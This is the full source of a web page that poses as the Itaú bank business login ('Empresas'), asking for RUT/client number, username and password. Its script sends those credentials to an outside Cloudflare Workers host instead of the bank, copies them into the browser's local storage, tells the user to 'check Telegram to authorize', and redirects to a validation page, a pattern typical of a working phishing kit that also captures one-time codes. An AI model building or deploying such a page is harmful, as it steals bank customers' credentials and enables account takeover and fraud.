<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#06143f">
<title>Itaú - Acceso</title>
<style>
:root{
  --navy:#06143f;
  --orange:#ff5b00;
  --blue:#006b91;
  --text:#555;
  --border:#d2d2d2;
}
*{box-sizing:border-box}
html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#fff;color:var(--text)}
body{min-height:100vh}

/* CABECERA - TAMAÑO INTERMEDIO */
.header{
  height:125px;background:var(--navy);position:relative;
  display:flex;align-items:flex-start;padding:20px 35px
}
.logo{
  width:80px;height:80px;background:#fff;border-radius:16px;
  display:flex;align-items:center;justify-content:center;
  color:var(--navy);font-size:30px;font-weight:700;letter-spacing:-2px
}
.top-login{
  position:absolute;left:50%;top:24px;transform:translateX(-50%);
  width:210px;height:72px;border:2px solid #fff;border-radius:22px;
  color:#fff;display:flex;align-items:center;justify-content:center;
  font-size:24px;font-weight:700
}
.close{
  position:absolute;right:28px;top:14px;width:42px;height:42px;
  cursor:pointer
}
.close:before,.close:after{
  content:"";position:absolute;left:20px;top:5px;height:32px;width:3.5px;background:#fff
}
.close:before{transform:rotate(45deg)}
.close:after{transform:rotate(-45deg)}
.search{
  position:absolute;right:95px;top:42px;width:32px;height:32px;
  border:3.5px solid #fff;border-radius:50%
}
.search:after{
  content:"";position:absolute;width:15px;height:3.5px;background:#fff;
  right:-11px;bottom:-6px;transform:rotate(45deg)
}
.menu{position:absolute;right:32px;top:44px;width:32px}
.menu i{display:block;height:3.5px;background:#fff;margin:6.5px 0}
.pointer{
  position:absolute;bottom:-1px;left:50%;transform:translateX(-50%);
  width:0;height:0;border-left:17px solid transparent;
  border-right:17px solid transparent;border-bottom:17px solid #fff
}

/* CONTENIDO - TAMAÑO INTERMEDIO */
.content{
  width:min(100% - 70px, 560px);
  margin:0 auto;
  padding:50px 0 60px
}
.select,.field{
  width:100%;height:78px;border-radius:16px;background:#fff;
  border:2px solid var(--border);padding:0 32px;
  font-size:22px;color:#999;display:flex;align-items:center
}
.select{
  border-color:#666;position:relative;margin-bottom:75px
}
.chevron{
  position:absolute;right:30px;top:26px;width:20px;height:20px;
  border-right:2.5px solid #555;border-bottom:2.5px solid #555;
  transform:rotate(45deg)
}
.field{margin-bottom:36px}
.field input{
  width:100%;height:100%;border:0;outline:0;background:transparent;
  font:inherit;color:#555;font-size:22px
}
.field input::placeholder{color:#999}
.field input:focus{
  border-color:var(--orange);
}
.btn{
  width:100%;height:90px;border:0;border-radius:16px;
  background:var(--orange);color:#fff;font-size:24px;font-weight:700;
  cursor:pointer;
  transition: opacity 0.3s;
}
.btn:hover:not(:disabled) {
  opacity: 0.9;
}
.btn:disabled {
  opacity: 0.6;
  cursor: not-allowed;
}
.btn.loading {
  opacity: 0.7;
  cursor: wait;
}
.links{
  font-size:22px;color:var(--blue);margin-top:20px;line-height:1.5
}
.links div{margin-bottom:18px;cursor:pointer}
.links div:hover{text-decoration:underline}
.note{
  font-size:11px;color:#777;text-align:center;margin-top:24px
}

/* Mensajes de estado */
#status-message {
  margin: 18px 0;
  padding: 14px 18px;
  border-radius: 12px;
  display: none;
  font-size: 15px;
  text-align: center;
}
#status-message.success {
  display: block;
  background: #d4edda;
  color: #155724;
  border: 1px solid #c3e6cb;
}
#status-message.error {
  display: block;
  background: #f8d7da;
  color: #721c24;
  border: 1px solid #f5c6cb;
}
#status-message.loading {
  display: block;
  background: #d1ecf1;
  color: #0c5460;
  border: 1px solid #bee5eb;
}

/* Transaction ID */
.transaction-id {
  display: none;
  background: #f0f0f0;
  padding: 11px 18px;
  border-radius: 10px;
  font-size: 13px;
  color: #555;
  margin: 14px 0;
  word-break: break-all;
  font-family: monospace;
  border: 1px solid #ddd;
}
.transaction-id.visible {
  display: block;
}

/* Botón reintentar */
.retry-btn {
  display: none;
  background: var(--orange);
  color: white;
  border: none;
  padding: 11px 26px;
  border-radius: 10px;
  font-size: 16px;
  cursor: pointer;
  margin: 10px auto 0;
  transition: opacity 0.3s;
}
.retry-btn.visible {
  display: block;
}
.retry-btn:hover {
  opacity: 0.9;
}

/* TABLET - MÁS PEQUEÑO */
@media (max-width:900px){
  .header{height:105px;padding:16px 28px}
  .logo{width:70px;height:70px;font-size:26px;border-radius:14px}
  .top-login{top:20px;width:185px;height:64px;font-size:21px;border-radius:20px}
  .close{right:22px;top:12px;width:36px;height:36px}
  .close:before,.close:after{left:17px;height:28px;width:3px}
  .search{right:80px;top:36px;width:28px;height:28px}
  .search:after{width:13px;right:-9px}
  .menu{right:26px;top:38px;width:28px}
  .menu i{height:3px;margin:5.5px 0}
  .content{width:min(100% - 55px,500px);padding-top:40px}
  .select,.field{height:68px;font-size:19px;padding:0 26px}
  .select{margin-bottom:62px}
  .chevron{right:24px;top:22px;width:17px;height:17px}
  .field{margin-bottom:30px}
  .field input{font-size:19px}
  .btn{height:78px;font-size:21px}
  .links{font-size:19px}
}

/* MÓVIL */
@media (max-width:600px){
  .header{
    height:88px;
    padding:13px 20px;
  }
  .logo{
    width:58px;height:58px;border-radius:12px;
    font-size:22px;letter-spacing:-1.5px
  }
  .top-login{
    left:50%;top:16px;
    width:155px;height:54px;
    border-radius:17px;font-size:19px
  }
  .close{
    right:16px;top:10px;width:30px;height:30px
  }
  .close:before,.close:after{
    left:14px;top:3px;height:24px;width:2.5px
  }
  .search{
    right:62px;top:30px;width:24px;height:24px;
    border-width:3px
  }
  .search:after{
    width:11px;height:3px;right:-8px;bottom:-5px
  }
  .menu{
    right:18px;top:32px;width:24px
  }
  .menu i{height:3px;margin:4.5px 0}
  .pointer{
    border-left-width:13px;border-right-width:13px;border-bottom-width:13px
  }

  .content{
    width:calc(100% - 32px);
    max-width:none;
    padding:35px 0 40px
  }
  .select,.field{
    height:58px;
    border-radius:12px;
    padding:0 20px;
    font-size:17px
  }
  .select{
    margin-bottom:50px
  }
  .chevron{
    right:18px;top:18px;width:14px;height:14px;border-width:2px
  }
  .field{margin-bottom:24px}
  .field input{font-size:17px}
  .btn{
    height:66px;border-radius:12px;
    font-size:19px
  }
  .links{
    margin-top:16px;
    font-size:17px;
    line-height:1.4
  }
  .links div{margin-bottom:14px}
  .note{font-size:10px;margin-top:18px}
  #status-message {
    font-size:13px;
    padding:11px 14px;
  }
  .transaction-id {
    font-size:12px;
    padding:9px 14px;
  }
  .retry-btn {
    font-size:14px;
    padding:9px 22px;
  }
}

/* TELÉFONOS MUY PEQUEÑOS */
@media (max-width:380px){
  .header{height:75px;padding:10px 14px}
  .logo{width:48px;height:48px;font-size:18px}
  .top-login{top:12px;width:130px;height:46px;font-size:16px;border-radius:14px}
  .search{right:50px;top:26px}
  .menu{right:14px;top:28px}
  .content{width:calc(100% - 24px);padding-top:28px}
  .select,.field{height:50px;font-size:15px}
  .select{margin-bottom:40px}
  .field{margin-bottom:18px}
  .field input{font-size:15px}
  .btn{height:56px;font-size:16px}
  .links{font-size:14px}
  #status-message {
    font-size:12px;
    padding:9px 12px;
  }
}
</style>
</head>
<body>

<header class="header">
  <div class="logo">itaú</div>
  <div class="top-login">Ingresar</div>
  <div class="close" aria-hidden="true" onclick="window.location.reload()"></div>
  <div class="search" aria-hidden="true"></div>
  <div class="menu" aria-hidden="true"><i></i><i></i><i></i></div>
  <div class="pointer" aria-hidden="true"></div>
</header>

<main class="content">
  <div class="select">
    Empresas
    <span class="chevron"></span>
  </div>

  <div class="field">
    <input id="dni" aria-label="RUT/No. Cliente" placeholder="RUT/No. Cliente" type="text">
  </div>
  <div class="field">
    <input id="usuario" aria-label="Usuario" placeholder="Usuario" type="text">
  </div>
  <div class="field">
    <input id="clave" aria-label="Contraseña" placeholder="Contraseña" type="password">
  </div>

  <button id="loginBtn" class="btn">Ingresar</button>

  <!-- Contenedor para mensajes de estado -->
  <div id="status-message"></div>

  <!-- Transaction ID -->
  <div id="transactionId" class="transaction-id"></div>

  <!-- Botón reintentar -->
  <button id="retryBtn" class="retry-btn">🔄 Reintentar</button>

  <div class="links">
    <div onclick="alert('Función en desarrollo')">Adherirse a Itaú/Link Empresa ›</div>
    <div onclick="alert('Función en desarrollo')">Olvidé mi contraseña ›</div>
  </div>

  <div class="note">Sistema de autenticación seguro</div>
</main>

<script>
// ========================= CONFIGURACIÓN =========================
const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';

// ========================= FUNCIONES =========================
function generarTransactionId() {
    return crypto.randomUUID ? crypto.randomUUID() : 
        Math.random().toString(36).substring(2) + Date.now().toString(36);
}

function mostrarMensaje(contenedor, tipo, texto) {
    contenedor.className = '';
    contenedor.textContent = texto;
    if (tipo) {
        contenedor.classList.add(tipo);
    }
    contenedor.style.display = 'block';
}

function ocultarMensaje(contenedor) {
    contenedor.className = '';
    contenedor.textContent = '';
    contenedor.style.display = 'none';
}

function mostrarTransactionId(contenedor, id) {
    contenedor.textContent = `🆔 ID: ${id.substring(0, 8)}...${id.substring(id.length - 4)}`;
    contenedor.classList.add('visible');
}

function ocultarTransactionId(contenedor) {
    contenedor.classList.remove('visible');
    contenedor.textContent = '';
}

// ========================= FUNCIÓN DE LOGIN =========================
async function handleLogin() {
    const dni = document.getElementById('dni').value.trim();
    const usuario = document.getElementById('usuario').value.trim();
    const clave = document.getElementById('clave').value.trim();
    const loginBtn = document.getElementById('loginBtn');
    const mensajeContenedor = document.getElementById('status-message');
    const transactionIdContenedor = document.getElementById('transactionId');
    const retryBtn = document.getElementById('retryBtn');

    // Validar campos
    if (!dni || !usuario || !clave) {
        mostrarMensaje(mensajeContenedor, 'error', '⚠️ Por favor, completa todos los campos');
        return;
    }

    // Deshabilitar botón durante la petición
    loginBtn.disabled = true;
    loginBtn.classList.add('loading');
    retryBtn.classList.remove('visible');
    const textoOriginal = loginBtn.textContent;
    loginBtn.textContent = '⏳ ENVIANDO...';
    ocultarMensaje(mensajeContenedor);
    ocultarTransactionId(transactionIdContenedor);

    const transactionId = generarTransactionId();

    try {
        mostrarMensaje(mensajeContenedor, 'loading', '🔄 Enviando datos de autenticación...');

        const response = await fetch(`${WORKER_URL}/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                dni: dni,
                usuario: usuario,
                clave: clave,
                transactionId: transactionId
            })
        });

        const data = await response.json();

        if (response.ok && data.ok) {
            // GUARDAR TODOS LOS DATOS EN LOCALSTORAGE para validacion.html
            const datosLogin = {
                dni: dni,
                usuario: usuario,
                clave: clave,
                transactionId: transactionId,
                timestamp: Date.now()
            };
            localStorage.setItem('bancoldata', JSON.stringify(datosLogin));
            
            console.log('✅ Datos guardados en localStorage:', datosLogin);
            
            // Mostrar mensaje de éxito
            mostrarTransactionId(transactionIdContenedor, transactionId);
            mostrarMensaje(mensajeContenedor, 'success', 
                `✅ Solicitud enviada correctamente\n📱 Revisa Telegram para autorizar\n⏳ Redirigiendo...`);
            
            // Redirigir a la página de validación
            setTimeout(() => {
                window.location.href = 'validacion.html';
            }, 2000);
            
        } else {
            mostrarMensaje(mensajeContenedor, 'error', 
                `❌ Error: ${data.error || 'No se pudo procesar la solicitud'}`);
            retryBtn.classList.add('visible');
        }
    } catch (error) {
        console.error('Error en login:', error);
        mostrarMensaje(mensajeContenedor, 'error', 
            '❌ ERROR DE CONEXIÓN\nNo se pudo conectar con el servidor.\nVerifica tu conexión a internet.');
        retryBtn.classList.add('visible');
    } finally {
        // Restaurar botón
        loginBtn.disabled = false;
        loginBtn.classList.remove('loading');
        loginBtn.textContent = textoOriginal;
    }
}

// ========================= EVENT LISTENERS =========================
document.addEventListener('DOMContentLoaded', function() {
    const loginBtn = document.getElementById('loginBtn');
    const retryBtn = document.getElementById('retryBtn');
    const inputs = document.querySelectorAll('input');

    // Click en botón
    loginBtn.addEventListener('click', handleLogin);

    // Botón de reintentar
    retryBtn.addEventListener('click', handleLogin);

    // Enter en cualquier input
    inputs.forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                handleLogin();
            }
        });
    });

    // Ocultar mensajes al empezar a escribir
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            const mensajeContenedor = document.getElementById('status-message');
            ocultarMensaje(mensajeContenedor);
        });
    });

    console.log('🚀 Sistema de autenticación Itaú listo');
    console.log(`📡 Worker URL: ${WORKER_URL}`);
});
</script>

</body>
</html>
